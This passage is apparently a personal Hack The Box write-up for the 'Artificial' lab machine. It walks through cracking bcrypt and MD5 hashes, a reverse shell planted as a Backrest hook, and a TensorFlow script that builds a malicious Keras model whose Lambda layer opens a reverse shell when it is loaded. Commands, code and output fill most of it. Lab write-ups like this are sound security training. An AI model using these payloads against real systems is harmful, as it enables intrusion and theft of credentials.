  
Hashes: 1 digests; 1 unique digests, 1 unique salts  
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates  
Rules: 1  
  
Optimizers applied:  
* Zero-Byte  
* Single-Hash  
* Single-Salt  
  
Watchdog: Temperature abort trigger set to 90c  
  
Host memory required for this attack: 61 MB  
  
Dictionary cache hit:  
* Filename..: /home/lkotlus/Nerd/wordlists/rockyou.txt  
* Passwords.: 14344385  
* Bytes.....: 139921507  
* Keyspace..: 14344385  
  
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO:!@#$%^  
                                                            
Session..........: hashcat  
Status...........: Cracked  
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))  
Hash.Target......: $2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP5...Zz/0QO  
Time.Started.....: Sun Aug  3 00:03:40 2025 (17 secs)  
Time.Estimated...: Sun Aug  3 00:03:57 2025 (0 secs)  
Kernel.Feature...: Pure Kernel  
Guess.Base.......: File (/home/lkotlus/Nerd/wordlists/rockyou.txt)  
Guess.Queue......: 1/1 (100.00%)  
Speed.#1.........:      317 H/s (10.58ms) @ Accel:2 Loops:8 Thr:16 Vec:1  
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)  
Progress.........: 5376/14344385 (0.04%)  
Rejected.........: 0/5376 (0.00%)  
Restore.Point....: 4928/14344385 (0.03%)  
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1016-1024  
Candidate.Engine.: Device Generator  
Candidates.#1....: universidad -> ginuwine  
Hardware.Mon.#1..: Temp: 61c Util: 96% Core:1530MHz Mem:6000MHz Bus:16  
  
Started: Sun Aug  3 00:03:34 2025  
Stopped: Sun Aug  3 00:03:58 2025
```
- At first it appears as if we didn't crack it due to the fact that we just have a bunch of random numbers and symbols. Note, however, that the format is `hash:pass`, so our password is `!@#$%^`.
- Let's go! We have what is at least an old set of credentials: `backrest_root:!@#$%^`
- WE ARE SO IN!

### Backrest, For Real
- So I created a repository for backups.
- This runs as root, so I could just backup `/root/` and be done, but that's lame. I want a shell.
- You can create hooks to run on certain events. I'll just put this bash reverse shell as the `CONDITION_PRUNE_START` event:
```a
bash -i >& /dev/tcp/10.10.14.237/8080 0>&1
```
- After creating the hook, there's an error. It's showing `Bad fd number`, so it's easy to see that the shell being used is `/bin/sh`. The payload just needs to be adjusted to:
```a
/bin/bash -c "bash -i >& /dev/tcp/10.10.14.237/8080 0>&1"
```
- Listen with netcat, start a prune, and...
```a
[lkotlus@work] [~/Nerd/htb/artificial]    
(bash)> nc -nlvp 8080  
Connection from 10.10.11.74:47444  
bash: cannot set terminal process group (1538): Inappropriate ioctl for device  
bash: no job control in this shell  
root@artificial:/# cat ~/root.txt  
cat ~/root.txt  
e1d79aa67d43c8b838f7cfe7a67c01a0
```
- And there we have it! Be a good sport and run `/root/scripts/cleanup.sh` so that nobody accidentally cheats off your work.

## Post-Machine Review
### Exploitation Path
- Create an account on the website they are hosting publicly
- Create the following script to build a payload (this is more optimized than the one seen in notes above):
```python
import tensorflow as tf
from tensorflow import keras
from tensorflow.keras import layers

# Actual exploit zone
def exploit(x):
    import os
    os.system("/bin/bash -c \"bash -i >& /dev/tcp/10.10.14.237/8080 0>&1\"")
    return x

# Build the model
model = keras.Sequential([
    layers.Dense(1, activation='relu', input_shape=(1,)),
    layers.Lambda(exploit)
])

# Save the model
model.save('profits_model.h5')
```
- Run a docker container and create the payload:
```a
[lkotlus@work] [~/Nerd/htb/artificial]    
(bash)> sudo docker run --entrypoint /bin/bash -v .:/exploit/ -it python:3.10-slim  
root@0205a070658f:/# pip install tensorflow==2.12.0
...
root@0205a070658f:/# cd /exploit  
root@0205a070658f:/exploit# python3 build_payload.py  
2025-08-04 18:46:51.400529: I tensorflow/tsl/cuda/cudart_stub.cc:28] Could not find cuda drivers on your machine, GPU will not be used.  
2025-08-04 18:46:51.430270: I tensorflow/tsl/cuda/cudart_stub.cc:28] Could not find cuda drivers on your machine, GPU will not be used.  
2025-08-04 18:46:51.430575: I tensorflow/core/platform/cpu_feature_guard.cc:182] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.  
To enable the following instructions: AVX2 FMA, in other operations, rebuild TensorFlow with the appropriate compiler flags.  
2025-08-04 18:46:52.057929: W tensorflow/compiler/tf2tensorrt/utils/py_utils.cc:38] TF-TRT Warning: Could not find TensorRT  
/bin/bash: connect: Connection refused  
/bin/bash: line 1: /dev/tcp/10.10.14.237/8080: Connection refused  
WARNING:tensorflow:Compiled the loaded model, but the compiled metrics have yet to be built. `model.compile_metrics` will be empty until you train or evaluate the model.
```
- After this, upload the file. Listen with `nc` for the reverse shell, and hit "View Predictions":
```a
[lkotlus@work] [~/Nerd/htb/artificial]    
(bash)> nc -nvlp 8080  
Connection from 10.10.11.74:38024  
bash: cannot set terminal process group (825): Inappropriate ioctl for device  
bash: no job control in this shell  
app@artificial:~/app$
```
- Print out the contents of `/home/app/app/instance/users.db`, copy and paste to your local machine:
```a
app@artificial:~/app$ cat instance/users.db && echo  
cat instance/users.db && echo  
���E�itablemodelmodelCREATE TABLE model (  
       id VARCHAR(36) NOT NULL,    
       filename VARCHAR(120) NOT NULL,    
       user_id INTEGER NOT NULL,    
       PRIMARY KEY (id),    
       FOREIGN KEY(user_id) REFERENCES user (id)  
))=indexsqlite_autoindex_model_1model�]�tableuseruserCREATE TABLE user (  
       id INTEGER NOT NULL,    
       username VARCHAR(100) NOT NULL,    
       email VARCHAR(120) NOT NULL,    
       password VARCHAR(200) NOT NULL,    
       PRIMARY KEY (id),    
       UNIQUE (username),    
       UNIQUE (email)  
X��B��X3#Mtmptmp@tmp.comfa816edb83e95bf0c8da580bdfd491ef5'Mjimjim@gmail.com5e027396789a18c37aeda616e3d7991b<3Mmarymary@artificial.htbbf041041e57f1aff3be7ea1abd6129d0>5Mroyerroyer@artificial.h  
tbbc25b1f80f544c0ab451c02a3dca9fc6@7Mrobertrobert@artificial.htbb606c5f5136170f15444251665638b36<3Mmarkmark@artificial.htb0f3d8c76530022670f1c6029eed09ccb<3Mgaelgael@artificial.htbc99175974b6  
e192936d97224638a34f8  
��������tmpjimary       royer  
robermark       gael  
\\�PU[d455f275-1d3d-4e64-a0e8-9d25f97ae776d455f275-1d3d-4e64-a0e8-9d25f97ae776.h5PU[59f13c4b-3665-40a1-bd09-2b1b56d8837e59f13c4b-3665-40a1-bd09-2b1b56d8837e.h5  
����(U59f13c4b-3665-40a1-bd09-2b1b56d8837e(Ud455f275-1d3d-4e64-a0e8-9d25f97ae776(
```
- Use `sqlite` to read user passwords, and crack the MD5 hashes:
```a
[lkotlus@work] [~/Nerd/htb/artificial]    
(bash)> sqlite3 users.db    
SQLite version 3.50.3 2025-07-17 13:25:10  
Enter ".help" for usage hints.  
sqlite> .tables  
model  user    
sqlite> SELECT * FROM user;  
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8  
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb  
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36  
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6  
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0  
6|fart|fart@fart.com|3f2f4295a5eb6ad967b832d35e048852  
7|tmpuser|tmpuser@tmp.com|32ecc7b16bde356f5d47cacc01118458
```
- After this, you should have `gael:mattp005numbertwo`. Use these credentials to gain SSH access, as Gael has reused his password.
- Running the `id` command reveals that Gael is in the `sysadm` group. Running this `find` command reveals an interesting file:
```a
gael@artificial:~$ find / -group sysadm
find: ‘/proc/tty/driver’: Permission denied  
...
/var/backups/backrest_backup.tar.gz  
find: ‘/sys/kernel/tracing’: Permission denied  
...
```
- Using `scp` to download the file, we can extract and see the `config.json` file for backrest:
```a
[lkotlus@work] [~/Nerd/htb/artificial]    
(bash)> scp gael@artificial.htb:/var/backups/backrest_backup.tar.gz .  
backrest_backup.tar.gz   
[lkotlus@work] [~/Nerd/htb/artificial]    
(bash)> tar -xvf backrest_backup.tar.gz    
backrest/  
backrest/restic  
backrest/oplog.sqlite-wal  
backrest/oplog.sqlite-shm  
backrest/.config/  
backrest/.config/backrest/  
backrest/.config/backrest/config.json  
backrest/oplog.sqlite.lock  
backrest/backrest  
backrest/tasklogs/  
backrest/tasklogs/logs.sqlite-shm  
backrest/tasklogs/.inprogress/  
backrest/tasklogs/logs.sqlite-wal  
backrest/tasklogs/logs.sqlite  
backrest/oplog.sqlite  
backrest/jwt-secret  
backrest/processlogs/  
backrest/processlogs/backrest.log  
backrest/install.sh  
[lkotlus@work] [~/Nerd/htb/artificial]    
(bash)> cat backrest/.config/backrest/config.json  
{  
 "modno": 2,  
 "version": 4,  
 "instance": "Artificial",  
 "auth": {  
   "disabled": false,  
   "users": [  
     {  
       "name": "backrest_root",  
       "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"  
     }  
   ]  
 }  
}
```
- Decode the `passwordBcrypt` field with base 64, and then crack with `hashcat`:
```a
[lkotlus@work] [~/Nerd/htb/artificial]    
(bash)> echo "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP" | base64 -d > backrest_hash.txt
[lkotlus@work] [~/Nerd/htb/artificial]    
(norm)> hashcat -m 3200 backrest_hash.txt ~/Nerd/wordlists/rockyou.txt    
hashcat (v6.2.6) starting  
  
...
  
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO:!@#$%^  
                                                            
...
```
- Now armed with `backrest_root:!@#$%^`, port forward backrest to your local machine:
```a
[lkotlus@work] [~/Nerd/htb/artificial]    
(bash)> ssh -L 9898:127.0.0.1:9898 gael@artificial.htb
```
- After this, login with the root credentials to `http://localhost:9898`. Create a backrest repository with a hook on `CONDITION_PRUNE_START`. This hook will include the classic reverse shell payload:
```a
/bin/bash -c "bash -i >& /dev/tcp/10.10.14.237/8080 0>&1"
```
- Listen with netcat, then prune the repository. You've pwned Artificial:
```a
[lkotlus@work] [~/Nerd/htb/artificial]    
(bash)> nc -nlvp 8080  
Connection from 10.10.11.74:47444  
bash: cannot set terminal process group (1538): Inappropriate ioctl for device  
bash: no job control in this shell  
root@artificial:/#
```
### Lessons Learned
- The biggest hurdle was the privilege escalation. The clear lesson is to look for every file that you have access to, especially if you're in a unique group.
- Beyond that, everything just required some thinking and thoroughness.